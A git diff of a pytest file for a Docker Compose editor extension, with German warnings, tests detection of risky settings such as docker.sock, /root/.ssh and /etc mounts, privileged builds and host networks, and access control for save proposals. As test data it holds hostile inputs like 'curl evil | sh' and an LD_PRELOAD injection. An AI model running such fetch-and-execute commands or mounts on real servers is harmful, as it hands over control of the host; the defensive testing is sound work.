@@ -4,13 +4,14 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import shutil
 import subprocess
 import sys
 from types import SimpleNamespace
 
 import pytest
-from docker_stack_fakes import EXT_DIR, FakeExec, FakeSettings, docker_on, ps, real_sftp, result, row  # noqa: F401 - Fixtures
+from docker_stack_fakes import EXT_DIR, FakeExec, FakeSettings, docker_on, login, ps, real_sftp, result, row  # noqa: F401 - Fixtures
 
 
 @pytest.fixture(autouse=True, scope="module")
@@ -114,9 +115,26 @@ def test_the_draft_arrives_on_stdin(tmp_path):
     )
 
 
+def test_risky_settings_host_near_variants():
+    _, editor, _, _ = _mods()
+    cfg = {
+        "services": {"a": {"volumes_from": ["b"], "device_cgroup_rules": ["c *:* rwm"]}},
+        "volumes": {
+            "disk": {"driver_opts": {"type": "ext4", "device": "/dev/sda1"}},
+            "union": {"driver_opts": {"type": "overlay", "o": "lowerdir=/a,upperdir=/b,workdir=/c", "device": "overlay"}},
+            "alt": {"name": "vorhanden", "external": True},
+        },
+    }
+    lines = editor.risky_settings(cfg)
+    assert len(lines) == 5, lines
+    for key in ("volumes_from", "device_cgroup_rules", "/dev/sda1", "overlay", "external"):
+        assert any(key in line for line in lines), key
+    assert len(editor.risky_settings(cfg, flag_external=False)) == 4
+
+
 def test_risky_settings():
     _, editor, _, _ = _mods()
-    assert editor.risky_settings(RISKY) == RISKY_LINES
+    assert editor.risky_settings(RISKY, roots=(FOLDER,)) == RISKY_LINES
     assert editor.risky_settings({"services": {"a": {"volumes": [{"type": "bind", "source": "/etc/../"}]}}}) == ["„a“ bindet / vom Server ein."]
     assert editor.risky_settings({"services": {"a": {"volumes": [{"type": "bind", "source": "/root/.ssh"}, {"type": "bind", "source": "/run/docker.sock"}]}}}) == [
         "„a“ bindet /root/.ssh vom Server ein.", "„a“ bekommt Zugriff auf docker.sock; wer den Container steuert, steuert damit den Server.",
@@ -132,7 +150,10 @@ def test_risky_settings():
     assert editor.risky_settings({"services": "kaputt", "volumes": [], "secrets": {"x": None}}) == []
     assert editor.risky_settings({"services": {"a": None, "b": {"cap_add": [7], "volumes": ["/:/x"], "devices": [None]}}}) == []
     assert editor.risky_settings({"volumes": {"nfs": {"driver_opts": {"type": "nfs", "o": "addr=10.0.0.2", "device": ":/export"}}}}) == []
-    assert editor.risky_settings({"services": {"a": {"volumes": [{"type": "bind", "source": "/etcetera"}, {"type": "bind", "source": "/srv/media"}]}}}) == []
+    assert editor.risky_settings({"services": {"a": {"volumes": [{"type": "bind", "source": "/srv/media"}, {"type": "bind", "source": "/mnt/nas/film"}]}}}) == []
+    assert editor.risky_settings({"services": {"a": {"volumes": [{"type": "bind", "source": "/etcetera"}]}}}) == [
+        "„a“ bindet /etcetera vom Server, außerhalb der Datenordner.",
+    ]
 
 
 @pytest.mark.parametrize(
@@ -156,9 +177,15 @@ def test_parse_check(code, stdout, stderr, error, unverified):
 
 def test_a_good_file():
     _, editor, _, _ = _mods()
-    checked = editor.parse_check(0, json.dumps(RISKY), 'time="x" level=warning msg="-: the attribute `version` is obsolete"\n', "compose.yaml")
+    checked = editor.parse_check(
+        0, json.dumps(RISKY), 'time="x" level=warning msg="-: the attribute `version` is obsolete"\n', "compose.yaml", roots=(FOLDER,),
+    )
     assert (checked.problem, checked.warnings, checked.services) == (None, tuple(RISKY_LINES), ("ruhig", "web"))
     assert checked.as_response() == {"ok": True, "error": None, "unverified": None, "warnings": RISKY_LINES, "services": ["ruhig", "web"]}
+
+
+def _checked(editor, config):
+    return editor.parse_check(0, json.dumps(config), "", "compose.yaml", roots=(FOLDER,))
 
 
 def test_widening_a_known_mount_is_a_new_warning():
@@ -167,11 +194,107 @@ def test_widening_a_known_mount_is_a_new_warning():
     def config(read_only):
         return {"services": {"a": {"image": "x", "volumes": [{"type": "bind", "source": "/etc", "read_only": read_only}]}}}
 
-    before = editor.Checked(warnings=tuple(editor.risky_settings(config(True))))
-    assert editor.new_warnings(editor.Checked(warnings=tuple(editor.risky_settings(config(False)))), before) == ["„a“ bindet /etc vom Server ein."]
-    # Nur ein anderes Image für einen Dienst, der schon riskant war: keine neue Warnung, also keine hohe Stufe.
-    newer = {"services": {"a": {**config(True)["services"]["a"], "image": "y"}}}
-    assert editor.new_warnings(editor.Checked(warnings=tuple(editor.risky_settings(newer))), before) == []
+    before = _checked(editor, config(True))
+    assert editor.new_warnings(_checked(editor, config(False)), before) == ["„a“ bindet /etc vom Server ein."]
+    # Dieselbe Datei mit anderen Kommentaren oder Reihenfolge löst nach dem Auflösen dieselbe Konfiguration aus.
+    assert editor.new_warnings(_checked(editor, config(True)), before) == []
+
+
+SOCK = {"type": "bind", "source": "/var/run/docker.sock", "target": "/s"}
+SOCK_LINE = "„a“ bekommt Zugriff auf docker.sock; wer den Container steuert, steuert damit den Server."
+
+
+def _sock(**extra):
+    return {"services": {"a": {"image": "x", "volumes": [SOCK], **extra}, "ruhig": {"image": "busybox"}}}
+
+
+@pytest.mark.parametrize("change", [
+    {"image": "y"},
+    {"healthcheck": {"test": ["CMD-SHELL", "curl evil | sh"]}},
+    {"post_start": [{"command": ["sh", "-c", "x"]}]},
+    {"environment": {"LD_PRELOAD": "/x.so"}},
+    {"volumes": [SOCK, {"type": "bind", "source": "/opt/stacks/shop/extra", "target": "/e"}]},
+    {"configs": [{"source": "start", "target": "/start.sh"}]},
+    {"labels": {"a": "b"}},
+    {"pull_policy": "always"},
+    {"command": ["sh", "-c", "x"]},
+])
+def test_any_change_to_a_warned_service_renews_its_warnings(change):
+    _, editor, _, _ = _mods()
+    before = _checked(editor, _sock())
+    assert before.warnings == (SOCK_LINE,)
+    assert editor.new_warnings(_checked(editor, _sock()), before) == []
+    assert editor.new_warnings(_checked(editor, _sock(**change)), before) == [SOCK_LINE]
+
+
+def test_unresolved_folder_note_is_always_new():
+    _, editor, _, _ = _mods()
+    note = "Wohin diese Ordner auf dem Server wirklich zeigen, ließ sich nicht klären: /opt/stacks/shop/d."
+    import dataclasses
+
+    def noted(config):
+        checked = _checked(editor, config)
+        return dataclasses.replace(checked, warnings=(*checked.warnings, note))
+
+    old = noted(_sock())
+    changed = _sock(image="y")
+    assert note in editor.new_warnings(noted(changed), old)
+
+
+@pytest.mark.parametrize("section", ["configs", "secrets"])
+def test_changed_content_of_a_used_entry_renews_the_service_warning(section):
+    _, editor, _, _ = _mods()
+
+    def config(content):
+        return {"services": {"a": {"image": "x", "volumes": [SOCK], section: [{"source": "start", "target": "/start.sh"}]}},
+                section: {"start": {"content": content}}}
+
+    before = _checked(editor, config("echo hallo"))
+    assert before.warnings == (SOCK_LINE,)
+    assert editor.new_warnings(_checked(editor, config("echo hallo")), before) == []
+    assert editor.new_warnings(_checked(editor, config("curl evil | sh")), before) == [SOCK_LINE]
+
+
+def test_changed_content_used_by_a_user_of_a_warned_volume_renews_the_warning():
+    _, editor, _, _ = _mods()
+
+    def config(content):
+        user = {"image": "x", "volumes": [{"type": "volume", "source": "w", "target": "/w"}], "configs": [{"source": "start", "target": "/s.sh"}]}
+        return {"name": "shop", "volumes": {"w": {"name": "shop_w", "driver": "evil"}}, "services": {"a": user},
+                "configs": {"start": {"content": content}}}
+
+    before = _checked(editor, config("echo hallo"))
+    assert len(before.warnings) == 1
+    assert editor.new_warnings(_checked(editor, config("echo hallo")), before) == []
+    assert editor.new_warnings(_checked(editor, config("curl evil | sh")), before) == list(before.warnings)
+
+
+def test_a_change_to_another_harmless_service_is_not_new():
+    _, editor, _, _ = _mods()
+    before = _checked(editor, _sock())
+    other = _sock()
+    other["services"]["ruhig"]["image"] = "busybox:2"
+    assert editor.new_warnings(_checked(editor, other), before) == []
+
+
+def _volume(users):
+    config = {"name": "shop", "volumes": {"w": {"name": "shop_w", "driver": "evil"}}, "services": {"ruhig": {"image": "busybox"}}}
+    for name, image in users.items():
+        config["services"][name] = {"image": image, "volumes": [{"type": "volume", "source": "w", "target": "/w"}]}
+    return config
+
+
+def test_warned_volume_is_renewed_by_image_swap_and_new_user():
+    _, editor, _, _ = _mods()
+    before = _checked(editor, _volume({"a": "x"}))
+    line = "Das Volume „w“ nutzt den Treiber „evil“, der auf dem Server eigene Programme ausführt."
+    assert before.warnings == (line,)
+    assert editor.new_warnings(_checked(editor, _volume({"a": "x"})), before) == []
+    assert editor.new_warnings(_checked(editor, _volume({"a": "y"})), before) == [line]
+    assert editor.new_warnings(_checked(editor, _volume({"a": "x", "b": "x"})), before) == [line]
+    harmless = _volume({"a": "x"})
+    harmless["services"]["ruhig"]["image"] = "busybox:2"
+    assert editor.new_warnings(_checked(editor, harmless), before) == []
 
 
 def test_only_new_warnings_count():
@@ -938,6 +1061,100 @@ async def test_save_through_the_gate(client, docker_on):
     assert (await client.get(_url(docker_on, "history/20990101T000000000000Z-00000000"), headers=docker_on.owner)).status_code == 404
 
 
+SECRET_CONTENT = "services:\n  web:\n    image: busybox:1.38\n    command: redis-server --requirepass hunter2-geheim\n"
+
+
+async def _proposal(client, docker_on, headers, *, risky):
+    """Schlägt mit `headers` eine Änderung vor, die ein Passwort im Befehl trägt; `risky` macht sie zu hoch."""
+    docker_on.handle.run_argv = _answering(docker_on.exec, iter([result(json.dumps(RISKY)), docker_on.exec.config])) if risky else docker_on.exec.run_argv
+    sent = await client.post(_url(docker_on, "save"), json=_body(docker_on, content=SECRET_CONTENT), headers=headers)
+    assert sent.status_code == 202, sent.text
+    return sent.json()["action_id"], sent.json()["risk"]
+
+
+@pytest.mark.asyncio
+async def test_proposal_content_only_for_those_who_may_decide(client, db_session, docker_on):
+    await _adopt(client, docker_on)
+    operator = await login(client, db_session, "op1", "operator")
+    action_id, risk = await _proposal(client, docker_on, docker_on.owner, risky=False)
+    assert risk == "medium"
+    url = _url(docker_on, f"save-proposals/{action_id}")
+    # Medium darf der Operator freigeben, also auch ansehen.
+    seen = await client.get(url, headers=operator)
+    assert seen.status_code == 200, seen.text
+    assert "hunter2-geheim" in seen.json()["content"] and "+    command: redis-server" in seen.json()["diff"]
+    assert seen.headers["cache-control"] == "no-store"
+    assert (await client.get(url, headers=docker_on.viewer)).status_code == 403
+    # Der Inhalt steht für niemanden in der Aktion selbst.
+    for headers in (docker_on.owner, operator):
+        assert "hunter2" not in (await client.get(f"/api/v1/actions/{action_id}", headers=headers)).text
+
+
+@pytest.mark.asyncio
+async def test_high_proposal_is_closed_to_operators_but_open_to_the_proposer(client, db_session, docker_on):
+    await _adopt(client, docker_on)
+    operator = await login(client, db_session, "op1", "operator")
+    action_id, risk = await _proposal(client, docker_on, docker_on.owner, risky=True)
+    assert risk == "high"
+    url = _url(docker_on, f"save-proposals/{action_id}")
+    assert (await client.get(url, headers=operator)).status_code == 403
+    assert (await client.get(url, headers=docker_on.owner)).status_code == 200
+    assert "hunter2" not in (await client.get(f"/api/v1/actions/{action_id}", headers=operator)).text
+    mine, mine_risk = await _proposal(client, docker_on, operator, risky=True)
+    assert mine_risk == "high"
+    assert (await client.get(_url(docker_on, f"save-proposals/{mine}"), headers=operator)).status_code == 200
+    assert (await client.get(_url(docker_on, "save-proposals/gibt-es-nicht"), headers=operator)).status_code == 404
+
+
+async def _change_action(db_session, action_id, **fields):
+    from nodvard_deck.models import Action
+
+    row = await db_session.get(Action, action_id)
+    for key, value in fields.items():
+        if key == "payload":
+            value = {**row.payload, **value}
+        setattr(row, key, value)
+    await db_session.commit()
+
+
+@pytest.mark.asyncio
+async def test_proposal_draft_must_match_the_action(client, db_session, docker_on):
+    await _adopt(client, docker_on)
+    mine, _risk = await _proposal(client, docker_on, docker_on.owner, risky=False)
+    other = await client.post(_url(docker_on, "save"), json=_body(docker_on, content=NEW.decode() + "# anders\n"), headers=docker_on.owner)
+    from nodvard_deck.models import Action
+
+    foreign_draft = (await db_session.get(Action, other.json()["action_id"])).payload["draft"]
+    await _change_action(db_session, mine, payload={"draft": foreign_draft})
+    seen = await client.get(_url(docker_on, f"save-proposals/{mine}"), headers=docker_on.owner)
+    assert seen.status_code == 409, seen.text
+    assert "hunter2" not in seen.text
+
+
+@pytest.mark.asyncio
+async def test_proposal_is_only_for_open_save_actions_of_that_stack(client, db_session, docker_on):
+    await _adopt(client, docker_on)
+    action_id, _risk = await _proposal(client, docker_on, docker_on.owner, risky=False)
+    url = _url(docker_on, f"save-proposals/{action_id}")
+    assert (await client.get(url.replace("/shop/", "/anderer/"), headers=docker_on.owner)).status_code == 404
+    await _change_action(db_session, action_id, action_type="docker.registry_login")
+    assert (await client.get(url, headers=docker_on.owner)).status_code == 404
+    await _change_action(db_session, action_id, action_type="docker.stack_save", status="denied")
+    assert (await client.get(url, headers=docker_on.owner)).status_code == 404
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("risky", [False, True])
+@pytest.mark.parametrize("role", ["viewer", "operator", "admin"])
+async def test_who_sees_a_proposal_matches_who_may_approve(client, db_session, docker_on, role, risky):
+    await _adopt(client, docker_on)
+    headers = docker_on.viewer if role == "viewer" else await login(client, db_session, f"u-{role}", role)
+    action_id, _risk = await _proposal(client, docker_on, docker_on.owner, risky=risky)
+    sees = (await client.get(_url(docker_on, f"save-proposals/{action_id}"), headers=headers)).status_code == 200
+    may_approve = (await client.post(f"/api/v1/actions/{action_id}/approve", headers=headers)).status_code != 403
+    assert sees == may_approve
+
+
 @pytest.mark.asyncio
 async def test_new_risky_settings_are_high_known_ones_are_not(client, docker_on, monkeypatch):
     await _adopt(client, docker_on)
@@ -1017,7 +1234,9 @@ async def test_reading_the_current_file(client, docker_on):
 
     docker_on.exec.sftp_server._reader = broken
     lost = await client.post(_url(docker_on, "save"), json=_body(docker_on), headers=docker_on.owner)
-    assert lost.status_code == 502 and lost.json()["detail"] == "Datei nicht lesbar: Kanal geschlossen"
+    assert lost.status_code == 502
+    assert re.fullmatch(r"Datei nicht lesbar\. Fehlerkennung: [0-9a-f]{32}\.", lost.json()["detail"])
+    assert "Kanal geschlossen" not in lost.text
 
 
 @pytest.mark.asyncio
@@ -1220,3 +1439,137 @@ async def test_routes_refuse_bad_stack_names_and_oversized_content(client, docke
     limit = sys.modules["nodvard_deck_ext_docker.editor"].MAX_FILE_BYTES
     huge = await client.post(_url(docker_on, "check"), json={"path": PATH, "content": "ä" * (limit // 2 + 1)}, headers=docker_on.owner)
     assert huge.status_code == 413 and huge.json()["detail"] == f"Die Datei ist größer als {limit // 1024} KB."
+
+
+def _warn(config, **kw):
+    _, editor, _, _ = _mods()
+    return editor.risky_settings({"name": "shop", **config}, roots=(FOLDER,), **kw)
+
+
+def test_a_calm_file_has_no_warnings():
+    config = {
+        "services": {"web": {
+            "image": "x", "command": None, "entrypoint": None, "restart": "always", "ports": [{"target": 80, "published": "80"}],
+            "networks": {"default": None}, "environment": {"A": "b"}, "healthcheck": {"test": ["CMD-SHELL", "true"]},
+            "security_opt": ["no-new-privileges:true"], "build": {"context": FOLDER, "dockerfile": "Dockerfile"}, "x-note": 1,
+            "volumes": [{"type": "bind", "source": f"{FOLDER}/daten"}, {"type": "volume", "source": "db"}],
+        }},
+        "networks": {"default": {"name": "shop_default", "ipam": {}}},
+        "volumes": {"db": {"name": "shop_db"}},
+        "x-shared": {},
+    }
+    assert _warn(config) == []
+
+
+@pytest.mark.parametrize(
+    ("config", "needle"),
+    [
+        ({"services": {"a": {"use_api_socket": True}}}, "use_api_socket"),
+        ({"services": {"a": {"build": {"context": "/home/deck/.docker"}}}}, "/home/deck/.docker"),
+        ({"services": {"a": {"build": {"context": "/root", "dockerfile": "Dockerfile"}}}}, "/root"),
+        ({"services": {"a": {"build": {"context": FOLDER, "dockerfile": "/etc/passwd"}}}}, "/etc/passwd"),
+        ({"services": {"a": {"build": {"context": ".", "network": "host"}}}}, "„network“"),
+        ({"services": {"a": {"build": {"context": ".", "privileged": True}}}}, "„privileged“"),
+        ({"services": {"a": {"build": {"context": ".", "entitlements": ["network.host"]}}}}, "„entitlements“"),
+        ({"include": ["x.yaml"]}, "„include“"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "none", "o": "bind", "device": "/var/lib/dpkg"}}}}, "/var/lib/dpkg"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "none", "o": "bind", "device": "/opt"}}}}, "/opt"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "ext4", "device": "/srv/disk.img"}}}}, "ext4"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "nfs", "o": "bind", "device": "/etc"}}}}, "/etc"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "tmpfs", "o": "bind", "device": "/root"}}}}, "/root"),
+        ({"volumes": {"v": {"name": "shop_v", "driver_opts": {"type": "cifs", "o": "rw,bind", "device": "/home/nico"}}}}, "/home/nico"),
+        ({"volumes": {"v": {"name": "fremd_v"}}}, "„fremd_v“"),
+        ({"volumes": {"v": {"name": "shop_v", "driver": "irgendwas"}}}, "„irgendwas“"),
+        ({"networks": {"n": {"name": "host"}}}, "host"),
+        ({"networks": {"n": {"name": "shop_n", "driver": "macvlan"}}}, "macvlan"),
+        ({"networks": {"n": {"name": "vorhanden", "external": True}}}, "external"),
+        ({"services": {"a": {"security_opt": ["seccomp=/tmp/profil.json"]}}}, "seccomp=/tmp/profil.json"),
+        ({"services": {"a": {"security_opt": ["label=type:spc_t"]}}}, "label=type:spc_t"),
+        ({"services": {"a": {"network_mode": "container:fremd"}}}, "network_mode: container:fremd"),
+        ({"services": {"a": {"pid": "service:b"}}}, "pid: service:b"),
+        ({"services": {"a": {"ipc": "container:x"}}}, "ipc: container:x"),
+        ({"services": {"a": {"post_start": [{"command": "id", "privileged": True}]}}}, "privileged"),
+        ({"services": {"a": {"pre_stop": [{"command": "id", "privileged": True}]}}}, "privileged"),
+        ({"services": {"a": {"volumes": [{"type": "bind", "source": "/var/spool/cron"}]}}}, "/var/spool/cron"),
+        ({"services": {"a": {"volumes": [{"type": "bind", "source": "/home", "read_only": True}]}}}, "/home"),
+        ({"services": {"a": {"volumes": [{"type": "bind", "source": "/var/backups", "read_only": True}]}}}, "/var/backups"),
+        ({"services": {"a": {"volumes": [{"type": "bind", "source": "/var/lib/systemd"}]}}}, "/var/lib/systemd"),
+        ({"secrets": {"s": {"name": "shop_s", "file": "/home/nico/geheim"}}}, "/home/nico/geheim"),
+    ],
+)
+def test_what_is_not_known_harmless_is_risky(config, needle):
+    lines = _warn(config)
+    assert lines and any(needle in line for line in lines), lines
+
+
+def test_a_link_inside_a_data_folder_is_judged_by_its_target():
+    link = f"{FOLDER}/daten/root"
+    config = {"services": {"a": {"volumes": [{"type": "bind", "source": link}]}}}
+    assert _warn(config) == []
+    assert _warn(config, resolved={link: f"{FOLDER}/daten/echt"}) == []
+    assert _warn(config, resolved={link: "/"}) == ["„a“ bindet / vom Server ein."]
+    assert _warn(config, resolved={link: "/home/nico"}) == [f"„a“ bindet {link}, das auf dem Server auf /home/nico zeigt, außerhalb der Datenordner."]
+
+
+@pytest.mark.asyncio
+async def test_the_check_resolves_links_on_the_server(tmp_path):
+    env = _setup(tmp_path)
+    await env.store.add("h1", _stack())
+    config = {"name": "shop", "services": {"web": {"image": "x", "volumes": [{"type": "bind", "source": f"{FOLDER}/daten/root"}]}}}
+    env.fake.config = result(json.dumps(config))
+    host = SimpleNamespace(id="h1")
+    calm = await env.editor.check(host, _stack(), 0, NEW)
+    assert calm.warnings == ()
+    env.fake.real_paths[f"{FOLDER}/daten/root"] = "/"
+    tricked = await env.editor.check(host, _stack(), 0, NEW)
+    assert tricked.warnings, "ein Verweis auf / ist riskant"
+    assert ["realpath", "-m", "--", f"{FOLDER}/daten/root"] in env.fake.argv_calls
+
+
+@pytest.mark.asyncio
+async def test_unresolvable_links_are_a_warning_not_a_pass(tmp_path):
+    env = _setup(tmp_path)
+    config = {"name": "shop", "services": {"web": {"image": "x", "volumes": [{"type": "bind", "source": f"{FOLDER}/daten"}]}}}
+    env.fake.config = result(json.dumps(config))
+    original = env.fake.run_argv
+
+    async def run_argv(host, argv, **kwargs):
+        if argv[:1] == ["realpath"]:
+            return result(stderr="realpath: invalid option -- 'm'\n", code=1)
+        return await original(host, argv, **kwargs)
+
+    env.fake.run_argv = run_argv
+    checked = await env.editor.check(SimpleNamespace(id="h1"), _stack(), 0, NEW)
+    assert len(checked.warnings) == 1 and f"{FOLDER}/daten" in checked.warnings[0]
+
+
+@pytest.mark.asyncio
+async def test_an_unexpected_error_while_resolving_is_a_warning(tmp_path):
+    env = _setup(tmp_path)
+    config = {"name": "shop", "services": {"web": {"image": "x", "volumes": [{"type": "bind", "source": f"{FOLDER}/daten"}]}}}
+    env.fake.config = result(json.dumps(config))
+    original = env.fake.run_argv
+
+    async def run_argv(host, argv, **kwargs):
+        if argv[:1] == ["realpath"]:
+            raise RuntimeError("Kanal kaputt")
+        return await original(host, argv, **kwargs)
+
+    env.fake.run_argv = run_argv
+    checked = await env.editor.check(SimpleNamespace(id="h1"), _stack(), 0, NEW)
+    assert len(checked.warnings) == 1 and f"{FOLDER}/daten" in checked.warnings[0]
+
+
+def test_a_service_of_the_same_file_may_share_the_network():
+    own = {"services": {"vpn": {"image": "x"}, "app": {"image": "x", "network_mode": "service:vpn", "pid": "service:vpn"}}}
+    assert _warn(own) == []
+    other = {"services": {"app": {"image": "x", "network_mode": "service:fehlt"}}}
+    assert any("network_mode: service:fehlt" in line for line in _warn(other))
+
+
+def test_a_build_context_in_the_stack_folder_is_calm_and_is_resolved():
+    _, editor, _, _ = _mods()
+    config = {"name": "shop", "services": {"a": {"build": {"context": FOLDER, "dockerfile": "Dockerfile"}}}}
+    assert _warn(config) == []
+    assert editor.bind_sources(config, (FOLDER,)) == [FOLDER]
+    assert _warn(config, resolved={FOLDER: "/home/deck"}) != []
